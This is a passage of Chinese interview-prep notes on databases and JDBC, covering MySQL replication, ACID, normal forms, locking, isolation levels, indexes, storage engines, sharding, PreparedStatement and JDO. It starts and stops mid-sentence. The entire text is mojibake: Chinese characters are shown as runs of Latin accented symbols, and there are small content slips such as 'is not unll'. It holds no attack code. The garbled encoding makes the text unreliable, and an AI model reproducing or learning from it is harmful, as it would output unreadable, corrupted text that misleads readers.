¹æ®è¯·æ±‚ä¿¡æ¯è¯»å–æ—¥å¿—æŒ‡å®šä½ç½®ä¹‹åçš„æ—¥å¿—ä¿¡æ¯ï¼Œè¿”å›ç»™Slaveçš„IOè¿›ç¨‹ã€‚è¿”å›ä¿¡æ¯ä¸­é™¤äº†æ—¥å¿—æ‰€åŒ…å«çš„ä¿¡æ¯ä¹‹å¤–ï¼Œè¿˜åŒ…æ‹¬æœ¬æ¬¡è¿”å›çš„ä¿¡æ¯å·²ç»åˆ°Masterç«¯çš„bin-logæ–‡ä»¶çš„åç§°ä»¥åŠbin-logçš„ä½ç½®ã€‚ Slaveçš„IOè¿›ç¨‹æ¥æ”¶åˆ°ä¿¡æ¯åï¼Œå°†æ¥æ”¶åˆ°çš„æ—¥å¿—å†…å®¹ä¾æ¬¡æ·»åŠ åˆ°Slaveç«¯çš„relay-logæ–‡ä»¶çš„æœ€æœ«ç«¯ï¼Œå¹¶å°†è¯»å–åˆ°çš„Masterç«¯çš„ bin-logçš„æ–‡ä»¶åå’Œä½ç½®è®°å½•åˆ°master-infoæ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿åœ¨ä¸‹ä¸€æ¬¡è¯»å–çš„æ—¶å€™èƒ½å¤Ÿæ¸…æ¥šçš„å‘Šè¯‰Masterâ€œæˆ‘éœ€è¦ä»æŸä¸ªbin-logçš„å“ªä¸ªä½ç½®å¼€å§‹å¾€åçš„æ—¥å¿—å†…å®¹ï¼Œè¯·å‘ç»™æˆ‘â€ã€‚ Slaveçš„Sqlè¿›ç¨‹æ£€æµ‹åˆ°relay-logä¸­æ–°å¢åŠ äº†å†…å®¹åï¼Œä¼šé©¬ä¸Šè§£ærelay-logçš„å†…å®¹æˆä¸ºåœ¨Masterç«¯çœŸå®æ‰§è¡Œæ—¶å€™çš„é‚£äº›å¯æ‰§è¡Œçš„å†…å®¹ï¼Œå¹¶åœ¨è‡ªèº«æ‰§è¡Œã€‚ æ•°æ®åº“ACIDçš„ç‰¹æ€§ã€‚åŸå­æ€§æ˜¯æŒ‡äº‹åŠ¡æ˜¯ä¸€ä¸ªä¸å¯åˆ†å‰²çš„å·¥ä½œå•ä½ï¼Œäº‹åŠ¡ä¸­çš„æ“ä½œè¦ä¹ˆéƒ½å‘ç”Ÿï¼Œè¦ä¹ˆéƒ½ä¸å‘ç”Ÿã€‚ ä¸€è‡´æ€§æŒ‡äº‹åŠ¡å‰åæ•°æ®çš„å®Œæ•´æ€§å¿…é¡»ä¿æŒä¸€è‡´ã€‚ éš”ç¦»æ€§æŒ‡å¤šä¸ªç”¨æˆ·å¹¶å‘è®¿é—®æ•°æ®åº“æ—¶ï¼Œä¸€ä¸ªç”¨æˆ·çš„äº‹åŠ¡ä¸èƒ½è¢«å…¶ä»–ç”¨æˆ·çš„äº‹åŠ¡æ‰€å¹²æ‰°ï¼Œå¤šä¸ªå¹¶å‘äº‹åŠ¡ä¹‹é—´æ•°æ®è¦ç›¸äº’éš”ç¦»ã€‚ æŒä¹…æ€§æ˜¯æŒ‡ä¸€ä¸ªäº‹åŠ¡ä¸€æ—¦æäº¤ï¼Œå®ƒå¯¹æ•°æ®åº“ä¸­æ•°æ®çš„æ”¹å˜å°±æ˜¯æ°¸ä¹…æ€§çš„ï¼Œå³ä¾¿æ•°æ®åº“å‘ç”Ÿæ•…éšœä¹Ÿä¸åº”è¯¥å¯¹å…¶æœ‰ä»»ä½•å½±å“ã€‚ è¯·ä½ ä»‹ç»ä¸€ä¸‹ï¼Œæ•°æ®åº“çš„ä¸‰ä¸ªèŒƒå¼ï¼Ÿç¬¬ä¸€èŒƒå¼ï¼ˆ1NFï¼‰å¼ºè°ƒçš„æ˜¯åˆ—çš„åŸå­æ€§ï¼Œå³åˆ—ä¸èƒ½å¤Ÿå†åˆ†æˆå…¶ä»–å‡ åˆ—ã€‚ç¬¬äºŒèŒƒå¼ï¼ˆ2NFï¼‰é¦–å…ˆæ˜¯ 1NFï¼Œå¦å¤–åŒ…å«ä¸¤éƒ¨åˆ†å†…å®¹ï¼Œä¸€æ˜¯è¡¨å¿…é¡»æœ‰ä¸€ä¸ªä¸»é”®ï¼›äºŒæ˜¯æ²¡æœ‰åŒ…å«åœ¨ä¸»é”®ä¸­çš„åˆ—å¿…é¡»å®Œå…¨ä¾èµ–äºä¸»é”®ï¼Œè€Œä¸èƒ½åªä¾èµ–äºä¸»é”®çš„ä¸€éƒ¨åˆ†ã€‚åœ¨1NFåŸºç¡€ä¸Šï¼Œä»»ä½•éä¸»å±æ€§ä¸ä¾èµ–äºå…¶å®ƒéä¸»å±æ€§[åœ¨2NFåŸºç¡€ä¸Šæ¶ˆé™¤ä¼ é€’ä¾èµ–]ã€‚ç¬¬ä¸‰èŒƒå¼ï¼ˆ3NFï¼‰ç¬¬ä¸‰èŒƒå¼ï¼ˆ3NFï¼‰æ˜¯ç¬¬äºŒèŒƒå¼ï¼ˆ2NFï¼‰çš„ä¸€ä¸ªå­é›†ï¼Œå³æ»¡è¶³ç¬¬ä¸‰èŒƒå¼ï¼ˆ3NFï¼‰å¿…é¡»æ»¡è¶³ç¬¬äºŒèŒƒå¼ï¼ˆ2NFï¼‰ã€‚é¦–å…ˆæ˜¯ 2NFï¼Œå¦å¤–éä¸»é”®åˆ—å¿…é¡»ç›´æ¥ä¾èµ–äºä¸»é”®ï¼Œä¸èƒ½å­˜åœ¨ä¼ é€’ä¾èµ–ã€‚å³ä¸èƒ½å­˜åœ¨ï¼šéä¸»é”®åˆ— A ä¾èµ–äºéä¸»é”®åˆ— Bï¼Œéä¸»é”®åˆ— B ä¾èµ–äºä¸»é”®çš„æƒ…å†µã€‚ è¯·ä½ ä»‹ç»ä¸€ä¸‹ï¼Œæ•°æ®åº“ä¹è§‚é”å’Œæ‚²è§‚é”æ‚²è§‚é” æ‚²è§‚é”ï¼ˆPessimistic Lockï¼‰ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å¾ˆæ‚²è§‚ï¼Œæ¯æ¬¡å»æ‹¿æ•°æ®çš„æ—¶å€™éƒ½è®¤ä¸ºåˆ«äººä¼šä¿®æ”¹ï¼Œæ‰€ä»¥æ¯æ¬¡åœ¨æ‹¿æ•°æ®çš„æ—¶å€™éƒ½ä¼šä¸Šé”ï¼Œè¿™æ ·åˆ«äººæƒ³æ‹¿è¿™ä¸ªæ•°æ®å°±ä¼šblockç›´åˆ°å®ƒæ‹¿åˆ°é”ã€‚æ‚²è§‚é”ï¼šå‡å®šä¼šå‘ç”Ÿå¹¶å‘å†²çªï¼Œå±è”½ä¸€åˆ‡å¯èƒ½è¿åæ•°æ®å®Œæ•´æ€§çš„æ“ä½œã€‚ Java synchronized å°±å±äºæ‚²è§‚é”çš„ä¸€ç§å®ç°ï¼Œæ¯æ¬¡çº¿ç¨‹è¦ä¿®æ”¹æ•°æ®æ—¶éƒ½å…ˆè·å¾—é”ï¼Œä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æ“ä½œæ•°æ®ï¼Œå…¶ä»–çº¿ç¨‹åˆ™ä¼šè¢«blockã€‚ ä¹è§‚é” ä¹è§‚é”ï¼ˆOptimistic Lockï¼‰ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å¾ˆä¹è§‚ï¼Œæ¯æ¬¡å»æ‹¿æ•°æ®çš„æ—¶å€™éƒ½è®¤ä¸ºåˆ«äººä¸ä¼šä¿®æ”¹ï¼Œæ‰€ä»¥ä¸ä¼šä¸Šé”ï¼Œä½†æ˜¯åœ¨æäº¤æ›´æ–°çš„æ—¶å€™ä¼šåˆ¤æ–­ä¸€ä¸‹åœ¨æ­¤æœŸé—´åˆ«äººæœ‰æ²¡æœ‰å»æ›´æ–°è¿™ä¸ªæ•°æ®ã€‚ä¹è§‚é”é€‚ç”¨äºè¯»å¤šå†™å°‘çš„åº”ç”¨åœºæ™¯ï¼Œè¿™æ ·å¯ä»¥æé«˜ååé‡ã€‚ ä¹è§‚é”ï¼šå‡è®¾ä¸ä¼šå‘ç”Ÿå¹¶å‘å†²çªï¼Œåªåœ¨æäº¤æ“ä½œæ—¶æ£€æŸ¥æ˜¯å¦è¿åæ•°æ®å®Œæ•´æ€§ã€‚ ä¹è§‚é”ä¸€èˆ¬æ¥è¯´æœ‰ä»¥ä¸‹2ç§æ–¹å¼ï¼š ä½¿ç”¨æ•°æ®ç‰ˆæœ¬ï¼ˆVersionï¼‰è®°å½•æœºåˆ¶å®ç°ï¼Œè¿™æ˜¯ä¹è§‚é”æœ€å¸¸ç”¨çš„ä¸€ç§å®ç°æ–¹å¼ã€‚ä½•è°“æ•°æ®ç‰ˆæœ¬ï¼Ÿå³ä¸ºæ•°æ®å¢åŠ ä¸€ä¸ªç‰ˆæœ¬æ ‡è¯†ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡ä¸ºæ•°æ®åº“è¡¨å¢åŠ ä¸€ä¸ªæ•°å­—ç±»å‹çš„ â€œversionâ€ å­—æ®µæ¥å®ç°ã€‚å½“è¯»å–æ•°æ®æ—¶ï¼Œå°†versionå­—æ®µçš„å€¼ä¸€åŒè¯»å‡ºï¼Œæ•°æ®æ¯æ›´æ–°ä¸€æ¬¡ï¼Œå¯¹æ­¤versionå€¼åŠ ä¸€ã€‚å½“æˆ‘ä»¬æäº¤æ›´æ–°çš„æ—¶å€™ï¼Œåˆ¤æ–­æ•°æ®åº“è¡¨å¯¹åº”è®°å½•çš„å½“å‰ç‰ˆæœ¬ä¿¡æ¯ä¸ç¬¬ä¸€æ¬¡å–å‡ºæ¥çš„versionå€¼è¿›è¡Œæ¯”å¯¹ï¼Œå¦‚æœæ•°æ®åº“è¡¨å½“å‰ç‰ˆæœ¬å·ä¸ç¬¬ä¸€æ¬¡å–å‡ºæ¥çš„versionå€¼ç›¸ç­‰ï¼Œåˆ™äºˆä»¥æ›´æ–°ï¼Œå¦åˆ™è®¤ä¸ºæ˜¯è¿‡æœŸæ•°æ®ã€‚ ä½¿ç”¨æ—¶é—´æˆ³ï¼ˆtimestampï¼‰ã€‚ä¹è§‚é”å®šçš„ç¬¬äºŒç§å®ç°æ–¹å¼å’Œç¬¬ä¸€ç§å·®ä¸å¤šï¼ŒåŒæ ·æ˜¯åœ¨éœ€è¦ä¹è§‚é”æ§åˆ¶çš„tableä¸­å¢åŠ ä¸€ä¸ªå­—æ®µï¼Œåç§°æ— æ‰€è°“ï¼Œå­—æ®µç±»å‹ä½¿ç”¨æ—¶é—´æˆ³ï¼ˆtimestampï¼‰, å’Œä¸Šé¢çš„versionç±»ä¼¼ï¼Œä¹Ÿæ˜¯åœ¨æ›´æ–°æäº¤çš„æ—¶å€™æ£€æŸ¥å½“å‰æ•°æ®åº“ä¸­æ•°æ®çš„æ—¶é—´æˆ³å’Œè‡ªå·±æ›´æ–°å‰å–åˆ°çš„æ—¶é—´æˆ³è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœä¸€è‡´åˆ™OKï¼Œå¦åˆ™å°±æ˜¯ç‰ˆæœ¬å†²çªã€‚ ä»‹ç»ä¸€ä¸‹æ•°æ®åº“çš„éš”ç¦»çº§åˆ« éš”ç¦»çº§åˆ« è„è¯»ï¼ˆDirty Readï¼‰ ä¸å¯é‡å¤è¯»ï¼ˆNonRepeatable Readï¼‰ å¹»è¯»ï¼ˆPhantom Readï¼‰ æœªæäº¤è¯»ï¼ˆRead uncommittedï¼‰ å¯èƒ½ å¯èƒ½ å¯èƒ½ å·²æäº¤è¯»ï¼ˆRead committedï¼‰ ä¸å¯èƒ½ å¯èƒ½ å¯èƒ½ å¯é‡å¤è¯»ï¼ˆRepeatable readï¼‰ ä¸å¯èƒ½ ä¸å¯èƒ½ å¯èƒ½ å¯ä¸²è¡ŒåŒ–ï¼ˆSerializable ï¼‰ ä¸å¯èƒ½ ä¸å¯èƒ½ ä¸å¯èƒ½ æœªæäº¤è¯»(Read Uncommitted)ï¼šå…è®¸è„è¯»ï¼Œä¹Ÿå°±æ˜¯å¯èƒ½è¯»å–åˆ°å…¶ä»–ä¼šè¯ä¸­æœªæäº¤äº‹åŠ¡ä¿®æ”¹çš„æ•°æ®ã€‚ æäº¤è¯»(Read Committed)ï¼šåªèƒ½è¯»å–åˆ°å·²ç»æäº¤çš„æ•°æ®ã€‚Oracleç­‰å¤šæ•°æ•°æ®åº“é»˜è®¤éƒ½æ˜¯è¯¥çº§åˆ« (ä¸é‡å¤è¯»)ã€‚ å¯é‡å¤è¯»(Repeated Read)ï¼šå¯é‡å¤è¯»ã€‚åœ¨åŒä¸€ä¸ªäº‹åŠ¡å†…çš„æŸ¥è¯¢éƒ½æ˜¯äº‹åŠ¡å¼€å§‹æ—¶åˆ»ä¸€è‡´çš„ï¼ŒInnoDBé»˜è®¤çº§åˆ«ã€‚åœ¨SQLæ ‡å‡†ä¸­ï¼Œè¯¥éš”ç¦»çº§åˆ«æ¶ˆé™¤äº†ä¸å¯é‡å¤è¯»ï¼Œä½†æ˜¯è¿˜å­˜åœ¨å¹»è±¡è¯»ã€‚ ä¸²è¡Œè¯»(Serializable)ï¼šå®Œå…¨ä¸²è¡ŒåŒ–çš„è¯»ï¼Œæ¯æ¬¡è¯»éƒ½éœ€è¦è·å¾—è¡¨çº§å…±äº«é”ï¼Œè¯»å†™ç›¸äº’éƒ½ä¼šé˜»å¡ã€‚ è¯´æ˜ä¸€ä¸‹ï¼Œæ•°æ®åº“ç´¢å¼•åº•å±‚æ˜¯æ€æ ·å®ç°çš„ï¼Œå“ªäº›æƒ…å†µä¸‹ç´¢å¼•ä¼šå¤±æ•ˆB+æ ‘å®ç°çš„ã€‚ æ²¡æœ‰éµå¾ªæœ€å·¦åŒ¹é…åŸåˆ™ã€‚ ä¸€äº›å…³é”®å­—ä¼šå¯¼è‡´ç´¢å¼•å¤±æ•ˆï¼Œä¾‹å¦‚ orï¼Œ ï¼= ï¼Œ not inï¼Œis null ,is not unll likeæŸ¥è¯¢æ˜¯ä»¥%å¼€å¤´ éšå¼è½¬æ¢ä¼šå¯¼è‡´ç´¢å¼•å¤±æ•ˆã€‚ å¯¹ç´¢å¼•åº”ç”¨å†…éƒ¨å‡½æ•°ï¼Œç´¢å¼•å­—æ®µè¿›è¡Œäº†è¿ç®—ã€‚ mysqlæ•°æ®åº“çš„ä¸¤ç§å¼•æ“ åŒºåˆ«InnoDBæ˜¯èšé›†ç´¢å¼•ï¼Œæ”¯æŒäº‹åŠ¡ï¼Œæ”¯æŒè¡Œçº§é”ï¼›MyISAMæ˜¯éèšé›†ç´¢å¼•ï¼Œä¸æ”¯æŒäº‹åŠ¡ï¼Œåªæ”¯æŒè¡¨çº§é”ã€‚ è¯·ä»‹ç»ä¸€ä¸‹ï¼Œæ•°æ®åº“ç´¢å¼•ï¼Œä»¥åŠï¼Œä»€ä¹ˆæ—¶å€™ç”¨Innodbä»€ä¹ˆæ—¶å€™ç”¨MyISAMã€‚ç´¢å¼•æ˜¯å¯¹æ•°æ®åº“è¡¨ä¸­ä¸€åˆ—æˆ–å¤šåˆ—çš„å€¼è¿›è¡Œæ’åºçš„ä¸€ç§ç»“æ„ï¼Œä½¿ç”¨ç´¢å¼•å¯å¿«é€Ÿè®¿é—®æ•°æ®åº“è¡¨ä¸­çš„ç‰¹å®šä¿¡æ¯ã€‚å¦‚æœæƒ³æŒ‰ç‰¹å®šèŒå‘˜çš„å§“æ¥æŸ¥æ‰¾ä»–æˆ–å¥¹ï¼Œåˆ™ä¸åœ¨è¡¨ä¸­æœç´¢æ‰€æœ‰çš„è¡Œç›¸æ¯”ï¼Œç´¢å¼•æœ‰åŠ©äºæ›´å¿«åœ°è·å–ä¿¡æ¯ã€‚ç´¢å¼•çš„ä¸€ä¸ªä¸»è¦ç›®çš„å°±æ˜¯åŠ å¿«æ£€ç´¢è¡¨ä¸­æ•°æ®çš„æ–¹æ³•ï¼Œäº¦å³èƒ½ååŠ©ä¿¡æ¯æœç´¢è€…å°½å¿«çš„æ‰¾åˆ°ç¬¦åˆé™åˆ¶æ¡ä»¶çš„è®°å½•IDçš„è¾…åŠ©æ•°æ®ç»“æ„ã€‚InnoDBä¸»è¦é¢å‘åœ¨çº¿äº‹åŠ¡å¤„ç†ï¼ˆOLTPï¼‰çš„åº”ç”¨ã€‚MyISAMä¸»è¦é¢å‘ä¸€äº›OLAPçš„åº”ç”¨ã€‚ æ•°æ®åº“æ°´å¹³åˆ‡åˆ†ä¸å‚ç›´åˆ‡åˆ†å‚ç›´æ‹†åˆ†å°±æ˜¯è¦æŠŠè¡¨æŒ‰æ¨¡å—åˆ’åˆ†åˆ°ä¸åŒæ•°æ®åº“è¡¨ä¸­ï¼ˆå½“ç„¶åŸåˆ™è¿˜æ˜¯ä¸ç ´åç¬¬ä¸‰èŒƒå¼ï¼‰ï¼Œè¿™ç§æ‹†åˆ†åœ¨å¤§å‹ç½‘ç«™çš„æ¼”å˜è¿‡ç¨‹ä¸­æ˜¯å¾ˆå¸¸è§çš„ã€‚å½“ä¸€ä¸ªç½‘ç«™è¿˜åœ¨å¾ˆå°çš„æ—¶å€™ï¼Œåªæœ‰å°é‡çš„äººæ¥å¼€å‘å’Œç»´æŠ¤ï¼Œå„æ¨¡å—å’Œè¡¨éƒ½åœ¨ä¸€èµ·ï¼Œå½“ç½‘ç«™ä¸æ–­ä¸°å¯Œå’Œå£®å¤§çš„æ—¶å€™ï¼Œä¹Ÿä¼šå˜æˆå¤šä¸ªå­ç³»ç»Ÿæ¥æ”¯æ’‘ï¼Œè¿™æ—¶å°±æœ‰æŒ‰æ¨¡å—å’ŒåŠŸèƒ½æŠŠè¡¨åˆ’åˆ†å‡ºæ¥çš„éœ€æ±‚ã€‚å…¶å®ï¼Œç›¸å¯¹äºå‚ç›´åˆ‡åˆ†æ›´è¿›ä¸€æ­¥çš„æ˜¯æœåŠ¡åŒ–æ”¹é€ ï¼Œè¯´å¾—ç®€å•å°±æ˜¯è¦æŠŠåŸæ¥å¼ºè€¦åˆçš„ç³»ç»Ÿæ‹†åˆ†æˆå¤šä¸ªå¼±è€¦åˆçš„æœåŠ¡ï¼Œé€šè¿‡æœåŠ¡é—´çš„è°ƒç”¨æ¥æ»¡è¶³ä¸šåŠ¡éœ€æ±‚çœ‹ï¼Œå› æ­¤è¡¨æ‹†å‡ºæ¥åè¦é€šè¿‡æœåŠ¡çš„å½¢å¼æš´éœ²å‡ºå»ï¼Œè€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ä¸åŒæ¨¡å—çš„è¡¨ï¼Œæ·˜å®åœ¨æ¶æ„ä¸æ–­æ¼”å˜è¿‡ç¨‹ï¼Œæœ€é‡è¦çš„ä¸€ç¯å°±æ˜¯æœåŠ¡åŒ–æ”¹é€ ï¼ŒæŠŠç”¨æˆ·ã€äº¤æ˜“ã€åº—é“ºã€å®è´è¿™äº›æ ¸å¿ƒçš„æ¦‚å¿µæŠ½å–æˆç‹¬ç«‹çš„æœåŠ¡ï¼Œä¹Ÿéå¸¸æœ‰åˆ©äºè¿›è¡Œå±€éƒ¨çš„ä¼˜åŒ–å’Œæ²»ç†ï¼Œä¿éšœæ ¸å¿ƒæ¨¡å—çš„ç¨³å®šæ€§ã€‚ å‚ç›´æ‹†åˆ†ï¼šå•è¡¨å¤§æ•°æ®é‡ä¾ç„¶å­˜åœ¨æ€§èƒ½ç“¶é¢ˆ æ°´å¹³æ‹†åˆ†ï¼Œä¸Šé¢è°ˆåˆ°å‚ç›´åˆ‡åˆ†åªæ˜¯æŠŠè¡¨æŒ‰æ¨¡å—åˆ’åˆ†åˆ°ä¸åŒæ•°æ®åº“ï¼Œä½†æ²¡æœ‰è§£å†³å•è¡¨å¤§æ•°æ®é‡çš„é—®é¢˜ï¼Œè€Œæ°´å¹³åˆ‡åˆ†å°±æ˜¯è¦æŠŠä¸€ä¸ªè¡¨æŒ‰ç…§æŸç§è§„åˆ™æŠŠæ•°æ®åˆ’åˆ†åˆ°ä¸åŒè¡¨æˆ–æ•°æ®åº“é‡Œã€‚ä¾‹å¦‚åƒè®¡è´¹ç³»ç»Ÿï¼Œé€šè¿‡æŒ‰æ—¶é—´æ¥åˆ’åˆ†è¡¨å°±æ¯”è¾ƒåˆé€‚ï¼Œå› ä¸ºç³»ç»Ÿéƒ½æ˜¯å¤„ç†æŸä¸€æ—¶é—´æ®µçš„æ•°æ®ã€‚è€ŒåƒSaaSåº”ç”¨ï¼Œé€šè¿‡æŒ‰ç”¨æˆ·ç»´åº¦æ¥åˆ’åˆ†æ•°æ®æ¯”è¾ƒåˆé€‚ï¼Œå› ä¸ºç”¨æˆ·ä¸ç”¨æˆ·ä¹‹é—´çš„éš”ç¦»çš„ï¼Œä¸€èˆ¬ä¸å­˜åœ¨å¤„ç†å¤šä¸ªç”¨æˆ·æ•°æ®çš„æƒ…å†µï¼Œç®€å•çš„æŒ‰user_idèŒƒå›´æ¥æ°´å¹³åˆ‡åˆ†ã€‚ é€šä¿—ç†è§£ï¼šæ°´å¹³æ‹†åˆ†è¡Œï¼Œè¡Œæ•°æ®æ‹†åˆ†åˆ°ä¸åŒè¡¨ä¸­ï¼Œ å‚ç›´æ‹†åˆ†åˆ—ï¼Œè¡¨æ•°æ®æ‹†åˆ†åˆ°ä¸åŒè¡¨ä¸­ã€‚ JDBCä¸­å¦‚ä½•è¿›è¡Œäº‹åŠ¡å¤„ç†ï¼ŸConnectionæä¾›äº†äº‹åŠ¡å¤„ç†çš„æ–¹æ³•ï¼Œé€šè¿‡è°ƒç”¨setAutoCommit(false)å¯ä»¥è®¾ç½®æ‰‹åŠ¨æäº¤äº‹åŠ¡ï¼›å½“äº‹åŠ¡å®Œæˆåç”¨commit()æ˜¾å¼æäº¤äº‹åŠ¡ï¼›å¦‚æœåœ¨äº‹åŠ¡å¤„ç†è¿‡ç¨‹ä¸­å‘ç”Ÿå¼‚å¸¸åˆ™é€šè¿‡rollback()è¿›è¡Œäº‹åŠ¡å›æ»šã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä»JDBC 3.0ä¸­è¿˜å¼•å…¥äº†Savepointï¼ˆä¿å­˜ç‚¹ï¼‰çš„æ¦‚å¿µï¼Œå…è®¸é€šè¿‡ä»£ç è®¾ç½®ä¿å­˜ç‚¹å¹¶è®©äº‹åŠ¡å›æ»šåˆ°æŒ‡å®šçš„ä¿å­˜ç‚¹ã€‚ ä»€ä¹ˆæ˜¯æ•°æ®åº“ä¸­äº‹åŠ¡çš„ACIDï¼Ÿ- åŸå­æ€§(Atomic)ï¼šäº‹åŠ¡ä¸­å„é¡¹æ“ä½œï¼Œè¦ä¹ˆå…¨åšè¦ä¹ˆå…¨ä¸åšï¼Œä»»ä½•ä¸€é¡¹æ“ä½œçš„å¤±è´¥éƒ½ä¼šå¯¼è‡´æ•´ä¸ªäº‹åŠ¡çš„å¤±è´¥ï¼› - ä¸€è‡´æ€§(Consistent)ï¼šäº‹åŠ¡ç»“æŸåç³»ç»ŸçŠ¶æ€æ˜¯ä¸€è‡´çš„ï¼›- éš”ç¦»æ€§(Isolated)ï¼šå¹¶å‘æ‰§è¡Œçš„äº‹åŠ¡å½¼æ­¤æ— æ³•çœ‹åˆ°å¯¹æ–¹çš„ä¸­é—´çŠ¶æ€ï¼›- æŒä¹…æ€§(Durable)ï¼šäº‹åŠ¡å®Œæˆåæ‰€åšçš„æ”¹åŠ¨éƒ½ä¼šè¢«æŒä¹…åŒ–ï¼Œå³ä½¿å‘ç”Ÿç¾éš¾æ€§çš„å¤±è´¥ã€‚é€šè¿‡æ—¥å¿—å’ŒåŒæ­¥å¤‡ä»½å¯ä»¥åœ¨æ•…éšœå‘ç”Ÿåé‡å»ºæ•°æ®ã€‚ å…³äºäº‹åŠ¡ï¼Œåœ¨é¢è¯•ä¸­è¢«é—®åˆ°çš„æ¦‚ç‡æ˜¯å¾ˆé«˜çš„ï¼Œå¯ä»¥é—®çš„é—®é¢˜ä¹Ÿæ˜¯å¾ˆå¤šçš„ã€‚é¦–å…ˆéœ€è¦çŸ¥é“çš„æ˜¯ï¼Œåªæœ‰å­˜åœ¨å¹¶å‘æ•°æ®è®¿é—®æ—¶æ‰éœ€è¦äº‹åŠ¡ã€‚å½“å¤šä¸ªäº‹åŠ¡è®¿é—®åŒä¸€æ•°æ®æ—¶ï¼Œå¯èƒ½ä¼šå­˜åœ¨5ç±»é—®é¢˜ï¼ŒåŒ…æ‹¬3ç±»æ•°æ®è¯»å–é—®é¢˜ï¼ˆè„è¯»ã€ä¸å¯é‡å¤è¯»å’Œå¹»è¯»ï¼‰å’Œ2ç±»æ•°æ®æ›´æ–°é—®é¢˜ï¼ˆç¬¬1ç±»ä¸¢å¤±æ›´æ–°å’Œç¬¬2ç±»ä¸¢å¤±æ›´æ–°ï¼‰ã€‚ ä½¿ç”¨JDBCæ“ä½œæ•°æ®åº“æ—¶ï¼Œç»å¸¸é‡åˆ°æ€§èƒ½é—®é¢˜ï¼Œè¯·ä½ è¯´æ˜ä¸€ä¸‹å¦‚ä½•æå‡è¯»å–æ•°æ®çš„æ€§èƒ½ï¼Œä»¥åŠæ›´æ–°æ•°æ®çš„æ€§èƒ½ï¼Ÿè¦æå‡è¯»å–æ•°æ®çš„æ€§èƒ½ï¼Œå¯ä»¥æŒ‡å®šé€šè¿‡ç»“æœé›†ï¼ˆResultSetï¼‰å¯¹è±¡çš„setFetchSize()æ–¹æ³•æŒ‡å®šæ¯æ¬¡æŠ“å–çš„è®°å½•æ•°ï¼ˆå…¸å‹çš„ç©ºé—´æ¢æ—¶é—´ç­–ç•¥ï¼‰ï¼›è¦æå‡æ›´æ–°æ•°æ®çš„æ€§èƒ½å¯ä»¥ä½¿ç”¨PreparedStatementè¯­å¥æ„å»ºæ‰¹å¤„ç†ï¼Œå°†è‹¥å¹²SQLè¯­å¥ç½®äºä¸€ä¸ªæ‰¹å¤„ç†ä¸­æ‰§è¡Œã€‚ è¯·ä½ è®²è®² Statement å’Œ PreparedStatement çš„åŒºåˆ«ï¼Ÿå“ªä¸ªæ€§èƒ½æ›´å¥½ï¼Ÿä¸Statementç›¸æ¯”ï¼Œâ‘ PreparedStatementæ¥å£ä»£è¡¨é¢„ç¼–è¯‘çš„è¯­å¥ï¼Œå®ƒä¸»è¦çš„ä¼˜åŠ¿åœ¨äºå¯ä»¥å‡å°‘SQLçš„ç¼–è¯‘é”™è¯¯å¹¶å¢åŠ SQLçš„å®‰å…¨æ€§ï¼ˆå‡å°‘SQLæ³¨å°„æ”»å‡»çš„å¯èƒ½æ€§ï¼‰ï¼›â‘¡PreparedStatementä¸­çš„SQLè¯­å¥æ˜¯å¯ä»¥å¸¦å‚æ•°çš„ï¼Œé¿å…äº†ç”¨å­—ç¬¦ä¸²è¿æ¥æ‹¼æ¥SQLè¯­å¥çš„éº»çƒ¦å’Œä¸å®‰å…¨ï¼›â‘¢å½“æ‰¹é‡å¤„ç†SQLæˆ–é¢‘ç¹æ‰§è¡Œç›¸åŒçš„æŸ¥è¯¢æ—¶ï¼ŒPreparedStatementæœ‰æ˜æ˜¾çš„æ€§èƒ½ä¸Šçš„ä¼˜åŠ¿ï¼Œç”±äºæ•°æ®åº“å¯ä»¥å°†ç¼–è¯‘ä¼˜åŒ–åçš„SQLè¯­å¥ç¼“å­˜èµ·æ¥ï¼Œä¸‹æ¬¡æ‰§è¡Œç›¸åŒç»“æ„çš„è¯­å¥æ—¶å°±ä¼šå¾ˆå¿«ï¼ˆä¸ç”¨å†æ¬¡ç¼–è¯‘å’Œç”Ÿæˆæ‰§è¡Œè®¡åˆ’ï¼‰ã€‚ ä¸ºäº†æä¾›å¯¹å­˜å‚¨è¿‡ç¨‹çš„è°ƒç”¨ï¼ŒJDBC APIä¸­è¿˜æä¾›äº†CallableStatementæ¥å£ã€‚å­˜å‚¨è¿‡ç¨‹ï¼ˆStored Procedureï¼‰æ˜¯æ•°æ®åº“ä¸­ä¸€ç»„ä¸ºäº†å®Œæˆç‰¹å®šåŠŸèƒ½çš„SQLè¯­å¥çš„é›†åˆï¼Œç»ç¼–è¯‘åå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œç”¨æˆ·é€šè¿‡æŒ‡å®šå­˜å‚¨è¿‡ç¨‹çš„åå­—å¹¶ç»™å‡ºå‚æ•°ï¼ˆå¦‚æœè¯¥å­˜å‚¨è¿‡ç¨‹å¸¦æœ‰å‚æ•°ï¼‰æ¥æ‰§è¡Œå®ƒã€‚è™½ç„¶è°ƒç”¨å­˜å‚¨è¿‡ç¨‹ä¼šåœ¨ç½‘ç»œå¼€é”€ã€å®‰å…¨æ€§ã€æ€§èƒ½ä¸Šè·å¾—å¾ˆå¤šå¥½å¤„ï¼Œä½†æ˜¯å­˜åœ¨å¦‚æœåº•å±‚æ•°æ®åº“å‘ç”Ÿè¿ç§»æ—¶å°±ä¼šæœ‰å¾ˆå¤šéº»çƒ¦ï¼Œå› ä¸ºæ¯ç§æ•°æ®åº“çš„å­˜å‚¨è¿‡ç¨‹åœ¨ä¹¦å†™ä¸Šå­˜åœ¨ä¸å°‘çš„å·®åˆ«ã€‚ è¯·ä½ è§£é‡Šä¸€ä¸‹Jdoä»¥åŠå®ƒçš„ä½œç”¨JDO æ˜¯Javaå¯¹è±¡æŒä¹…åŒ–çš„æ–°çš„è§„èŒƒï¼Œä¸ºjava data objectçš„ç®€ç§°,ä¹Ÿæ˜¯ä¸€ä¸ªç”¨äºå­˜å–æŸç§æ•°æ®ä»“åº“ä¸­çš„å¯¹è±¡çš„æ ‡å‡†åŒ–APIã€‚JDOæä¾›äº†é€æ˜çš„å¯¹è±¡å­˜å‚¨ï¼Œå› 